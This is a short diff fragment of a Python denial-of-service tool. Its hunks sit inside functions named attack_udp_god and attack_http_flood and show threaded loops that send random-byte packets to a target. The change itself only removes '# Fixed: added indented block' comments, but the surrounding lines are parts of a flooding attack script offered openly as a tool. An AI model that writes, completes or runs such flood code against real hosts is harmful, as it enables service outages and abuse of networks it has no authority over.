@@ -30,7 +30,7 @@ def attack_udp_god(ip, port, duration):
                         break
                     s.sendto(data, addr)
             except Exception as e:
-                pass  # Fixed: added indented block
+                pass
     
     def run2():
         data = random._urandom(16)
@@ -47,7 +47,7 @@ def attack_udp_god(ip, port, duration):
                         break
                     s.send(data)
             except Exception as e:
-                s.close()  # Fixed: added indented block
+                s.close()
     
     threads = []
     for y in range(threads_count):
@@ -184,7 +184,7 @@ def attack_http_flood(ip, port, duration):
             except:
                 pass
         except Exception as e:
-            pass  # Fixed: added indented block
+            pass
     
     threads = []
     for _ in range(threads_count):
